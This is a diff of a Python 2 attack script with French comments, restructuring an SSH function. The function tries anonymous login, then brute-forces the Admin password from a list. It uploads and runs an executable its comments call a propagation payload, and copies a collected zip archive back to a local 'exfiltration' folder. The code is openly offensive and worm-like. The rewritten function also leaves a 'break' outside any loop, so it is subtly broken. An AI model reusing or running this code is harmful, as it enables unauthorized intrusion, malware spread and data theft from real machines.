@@ -181,37 +181,38 @@ def bruteFTP(ip): #bruteforce FTP + récuperation de données
 
 def bruteSsh(ip): #BruteForce SSH + envoi de binaires + execution + récupération de données
 	exec_dir = ""
-	for password in passwords:
-		source = '/exploit_locale.exe'
-		destination ='/home/Admin/Desktop/exploit_locale.exe'
-		remotezip='/home/Admin/Desktop/collecte.zip'
-		tolocalzip='/exfiltration/collecte.zip'
-		#a activer ou désactiver pour le debug
-		#paramiko.util.log_to_file("paramiko.log")
-		ssh = paramiko.SSHClient()
-		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-		
+	source = '/exploit_locale.exe'
+	destination ='/home/Admin/Desktop/exploit_locale.exe'
+	remotezip='/home/Admin/Desktop/collecte.zip'
+	tolocalzip='/exfiltration/collecte.zip'
+	#a activer ou désactiver pour le debug
+	#paramiko.util.log_to_file("paramiko.log")
+	ssh = paramiko.SSHClient()
+	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+	
+	try:
+		ssh.connect(ip,port=22,username="Anonymous",password="")
+		print "[*] Connexion Anonyme établie, envoi et execution du script de propagation"
 		try:
-			ssh.connect(ip,port=22,username="Anonymous",password="")
-			print "[*] Connexion Anonyme établie, envoi et execution du script de propagation"
-			try:
-				sftp = ssh.open_sftp()
-				sftp.put(source,destination)
-				stdin, stdout, stderr = ssh.exec_command('start exploit_locale.exe')
-				time.sleep(5)
-				sftp.get(remotezip,tolocalzip)
-				break
+			sftp = ssh.open_sftp()
+			sftp.put(source,destination)
+			stdin, stdout, stderr = ssh.exec_command('start exploit_locale.exe')
+			time.sleep(5)
+			sftp.get(remotezip,tolocalzip)
+			break
 		
-			except:
-				print "[*] erreur lors du transfert sftp"
-				break
-			ssh.close()
 		except:
-			print "[*] Authentiofication anonyme echouée, démmarage du bruteforce"
+			print "[*] erreur lors du transfert sftp"
+			break
+		ssh.close()
+	except:
+		print "[*] Authentiofication anonyme echouée, démmarage du bruteforce"
+	
+	for password in passwords:	
 			
 		try:
 			ssh.connect(ip,port=22,username="Admin",password=password)
-			print "[*] SSH IP: %s Password found: %s\\n" % (current_target,password)
+			print "[*] SSH IP: %s Password found: %s\n" % (current_target,password)
 		except paramiko.AuthenticationException:
 			print "[*] SSH IP: %s Password failed: %s" % (current_target,password)
 			continue
